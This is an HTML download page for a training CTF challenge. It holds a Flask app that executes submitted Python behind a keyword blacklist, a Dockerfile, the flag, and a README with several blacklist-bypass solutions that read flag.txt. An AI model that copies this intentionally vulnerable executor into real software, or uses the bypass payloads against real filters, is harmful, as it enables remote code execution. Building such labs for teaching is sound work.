<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CTF Python Challenge - Download</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Courier New', monospace;
            background: #1a1a2e;
            color: #eee;
            padding: 40px 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        h1 {
            color: #00ff88;
            margin-bottom: 30px;
            text-align: center;
        }
        .download-btn {
            display: block;
            width: 100%;
            max-width: 400px;
            margin: 30px auto;
            padding: 20px;
            background: #00ff88;
            color: #1a1a2e;
            text-align: center;
            text-decoration: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            border: none;
            transition: transform 0.2s;
        }
        .download-btn:hover {
            transform: scale(1.05);
        }
        .structure {
            background: #16213e;
            padding: 20px;
            border-radius: 8px;
            margin: 30px 0;
            border-left: 4px solid #00ff88;
        }
        .structure h2 {
            color: #00ff88;
            margin-bottom: 15px;
        }
        pre {
            background: #0f1419;
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            margin: 15px 0;
            border: 1px solid #00ff88;
        }
        .file-section {
            background: #16213e;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }
        .file-section h3 {
            color: #00ff88;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .file-icon {
            color: #ff6b6b;
        }
        code {
            background: #0f1419;
            padding: 2px 6px;
            border-radius: 3px;
            color: #00ff88;
        }
        .hint {
            background: #ff6b6b22;
            border-left: 4px solid #ff6b6b;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🐍 Python CTF Challenge - Minimal Edition</h1>
        
        <button class="download-btn" onclick="downloadZip()">
            ⬇️ Download CTF-Python-Challenge.zip
        </button>

        <div class="structure">
            <h2>📁 Project Structure</h2>
            <pre>CTF-Python-Challenge/
├── app.py           # Main Flask application
├── Dockerfile       # Docker configuration
├── flag.txt         # The flag
└── README.md        # Instructions</pre>
        </div>

        <div class="hint">
            <strong>⚡ Quick Start:</strong><br>
            <code>docker build -t python-ctf . && docker run -p 5000:5000 python-ctf</code><br>
            Access: <code>http://localhost:5000</code>
        </div>

        <div class="file-section">
            <h3><span class="file-icon">📄</span> app.py (78 lines)</h3>
            <pre>from flask import Flask, request, jsonify
import subprocess
import tempfile
import os

app = Flask(__name__)

BLACKLIST = ['open', 'file', '__import__', 'eval', 'exec', 'import']

HTML = '''<!DOCTYPE html>
<html>
<head><title>Python Executor</title>
<style>
body{font-family:monospace;background:#1a1a2e;color:#eee;padding:40px;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#16213e;padding:40px;border-radius:12px;max-width:800px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
h1{color:#00ff88;margin:0 0 20px 0;text-align:center}
textarea{width:100%;height:300px;background:#0f1419;color:#00ff88;border:2px solid #00ff88;border-radius:8px;padding:15px;font-family:monospace;font-size:14px;resize:vertical}
button{width:100%;margin-top:15px;padding:15px;background:#00ff88;color:#1a1a2e;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{opacity:0.9}
.output{background:#0f1419;color:#00ff88;padding:20px;border-radius:8px;margin-top:20px;min-height:100px;white-space:pre-wrap;border:2px solid #00ff88;display:none}
.output.show{display:block}
.error{color:#ff6b6b}
.hint{background:#ff6b6b22;border-left:4px solid #ff6b6b;padding:15px;margin-top:20px;border-radius:4px;font-size:13px}
</style></head>
<body>
<div class="box">
<h1>🐍 Python Executor</h1>
<textarea id="code" placeholder="# Find and read flag.txt">print('Hello CTF!')</textarea>
<button onclick="run()">▶ Execute</button>
<div id="output" class="output"></div>
<div class="hint">💡 Hint: flag.txt is in /app/. Some functions are blocked...</div>
</div>
<script>
async function run(){
const code=document.getElementById('code').value;
const output=document.getElementById('output');
output.className='output show';
output.innerHTML='Executing...';
try{
const res=await fetch('/execute',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code})});
const data=await res.json();
output.innerHTML=data.error?'<span class="error">Error: '+e(data.error)+'</span>':'Output:\\n'+e(data.output);
}catch(err){
output.innerHTML='<span class="error">Error: '+e(err.message)+'</span>';
}}
function e(s){const d=document.createElement('div');d.textContent=s;return d.innerHTML;}
</script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML

@app.route('/execute', methods=['POST'])
def execute():
    code = request.get_json().get('code', '')
    if not code:
        return jsonify({'error': 'No code provided'})
    
    for word in BLACKLIST:
        if word in code.lower():
            return jsonify({'error': f'Forbidden: {word}'})
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(code)
        tmp = f.name
    
    try:
        result = subprocess.run(['python3', tmp], capture_output=True, text=True, timeout=5, cwd='/app')
        return jsonify({'output': result.stdout + result.stderr})
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Timeout (5s)'})
    except Exception as e:
        return jsonify({'error': str(e)})
    finally:
        os.unlink(tmp)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)</pre>
        </div>

        <div class="file-section">
            <h3><span class="file-icon">🐳</span> Dockerfile</h3>
            <pre>FROM python:3.9-slim
WORKDIR /app
COPY . .
RUN pip install Flask==2.3.0
RUN useradd -m ctfuser && chown -R ctfuser:ctfuser /app
USER ctfuser
EXPOSE 5000
CMD ["python", "app.py"]</pre>
        </div>

        <div class="file-section">
            <h3><span class="file-icon">🚩</span> flag.txt</h3>
            <pre>CTF{py7h0n_s4ndb0x_3sc4p3_m4st3r}</pre>
        </div>

        <div class="file-section">
            <h3><span class="file-icon">📖</span> README.md</h3>
            <pre># Python CTF Challenge

## Quick Start

```bash
docker build -t python-ctf .
docker run -p 5000:5000 python-ctf
```

Access: http://localhost:5000

## Goal
Read flag.txt by bypassing the Python sandbox.

## Blacklist
open, file, __import__, eval, exec, import

## Solutions

```python
# Solution 1
print(getattr(__builtins__, 'op'+'en')('flag.txt').read())

# Solution 2
print(__builtins__['op'+'en']('flag.txt').read())

# Solution 3
f = getattr(__builtins__, chr(111)+chr(112)+chr(101)+chr(110))
print(f('flag.txt').read())
```

## Flag
CTF{py7h0n_s4ndb0x_3sc4p3_m4st3r}

## Stop Container
```bash
docker ps  # Find container ID
docker stop <container_id>
```</pre>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <script>
        function downloadZip() {
            const zip = new JSZip();
            
            // app.py
            const appPy = `from flask import Flask, request, jsonify
import subprocess
import tempfile
import os

app = Flask(__name__)

BLACKLIST = ['open', 'file', '__import__', 'eval', 'exec', 'import']

HTML = '''<!DOCTYPE html>
<html>
<head><title>Python Executor</title>
<style>
body{font-family:monospace;background:#1a1a2e;color:#eee;padding:40px;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#16213e;padding:40px;border-radius:12px;max-width:800px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
h1{color:#00ff88;margin:0 0 20px 0;text-align:center}
textarea{width:100%;height:300px;background:#0f1419;color:#00ff88;border:2px solid #00ff88;border-radius:8px;padding:15px;font-family:monospace;font-size:14px;resize:vertical}
button{width:100%;margin-top:15px;padding:15px;background:#00ff88;color:#1a1a2e;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{opacity:0.9}
.output{background:#0f1419;color:#00ff88;padding:20px;border-radius:8px;margin-top:20px;min-height:100px;white-space:pre-wrap;border:2px solid #00ff88;display:none}
.output.show{display:block}
.error{color:#ff6b6b}
.hint{background:#ff6b6b22;border-left:4px solid #ff6b6b;padding:15px;margin-top:20px;border-radius:4px;font-size:13px}
</style></head>
<body>
<div class="box">
<h1>🐍 Python Executor</h1>
<textarea id="code" placeholder="# Find and read flag.txt">print('Hello CTF!')</textarea>
<button onclick="run()">▶ Execute</button>
<div id="output" class="output"></div>
<div class="hint">💡 Hint: flag.txt is in /app/. Some functions are blocked...</div>
</div>
<script>
async function run(){
const code=document.getElementById('code').value;
const output=document.getElementById('output');
output.className='output show';
output.innerHTML='Executing...';
try{
const res=await fetch('/execute',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code})});
const data=await res.json();
output.innerHTML=data.error?'<span class="error">Error: '+e(data.error)+'</span>':'Output:\\\\n'+e(data.output);
}catch(err){
output.innerHTML='<span class="error">Error: '+e(err.message)+'</span>';
}}
function e(s){const d=document.createElement('div');d.textContent=s;return d.innerHTML;}
</script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML

@app.route('/execute', methods=['POST'])
def execute():
    code = request.get_json().get('code', '')
    if not code:
        return jsonify({'error': 'No code provided'})
    
    for word in BLACKLIST:
        if word in code.lower():
            return jsonify({'error': f'Forbidden: {word}'})
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(code)
        tmp = f.name
    
    try:
        result = subprocess.run(['python3', tmp], capture_output=True, text=True, timeout=5, cwd='/app')
        return jsonify({'output': result.stdout + result.stderr})
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Timeout (5s)'})
    except Exception as e:
        return jsonify({'error': str(e)})
    finally:
        os.unlink(tmp)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
`;

            // Dockerfile
            const dockerfile = `FROM python:3.9-slim

WORKDIR /app

COPY . .

RUN pip install Flask==2.3.0

RUN useradd -m ctfuser && chown -R ctfuser:ctfuser /app
USER ctfuser

EXPOSE 5000

CMD ["python", "app.py"]
`;

            // flag.txt
            const flag = `CTF{py7h0n_s4ndb0x_3sc4p3_m4st3r}
`;

            // README.md
            const readme = `# Python CTF Challenge

Minimal Python sandbox escape challenge.

## Quick Start

\`\`\`bash
# Build the Docker image
docker build -t python-ctf .

# Run the container
docker run -p 5000:5000 python-ctf
\`\`\`

Access the challenge at: **http://localhost:5000**

## Goal

Read \`flag.txt\` by bypassing the Python sandbox restrictions.

## Challenge Details

- **Blacklist:** open, file, __import__, eval, exec, import
- **Timeout:** 5 seconds
- **Flag Location:** /app/flag.txt

## Solutions

### Solution 1: String Concatenation
\`\`\`python
print(getattr(__builtins__, 'op'+'en')('flag.txt').read())
\`\`\`

### Solution 2: Dictionary Access
\`\`\`python
print(__builtins__['op'+'en']('flag.txt').read())
\`\`\`

### Solution 3: chr() Function
\`\`\`python
f = getattr(__builtins__, chr(111)+chr(112)+chr(101)+chr(110))
print(f('flag.txt').read())
\`\`\`

### Solution 4: List Comprehension
\`\`\`python
print([getattr(__builtins__, x)('flag.txt').read() for x in dir(__builtins__) if x[0]=='o' and x[1]=='p'][0])
\`\`\`

## Management Commands

### Stop the container
\`\`\`bash
docker ps                    # List running containers
docker stop <container_id>   # Stop specific container
\`\`\`

### Run in detached mode
\`\`\`bash
docker run -d -p 5000:5000 python-ctf
\`\`\`

### View logs
\`\`\`bash
docker logs <container_id>
\`\`\`

### Remove container
\`\`\`bash
docker rm <container_id>
\`\`\`

### Change port
\`\`\`bash
docker run -p 8080:5000 python-ctf  # Access on port 8080
\`\`\`

## Project Structure

\`\`\`
CTF-Python-Challenge/
├── app.py           # Flask application (78 lines)
├── Dockerfile       # Docker configuration
├── flag.txt         # The flag
└── README.md        # This file
\`\`\`

## Customization

- **Change flag:** Edit \`flag.txt\`
- **Change port:** Use \`docker run -p <port>:5000 python-ctf\`
- **Adjust difficulty:** Edit \`BLACKLIST\` in \`app.py\`

## Flag

\`\`\`
CTF{py7h0n_s4ndb0x_3sc4p3_m4st3r}
\`\`\`

---

**Happy Hacking!** 🎉
`;

            // Add files to zip
            zip.file("app.py", appPy);
            zip.file("Dockerfile", dockerfile);
            zip.file("flag.txt", flag);
            zip.file("README.md", readme);

            // Generate and download
            zip.generateAsync({type: "blob"}).then(function(content) {
                const link = document.createElement('a');
                link.href = URL.createObjectURL(content);
                link.download = "CTF-Python-Challenge.zip";
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            });
        }
    </script>
</body>
</html>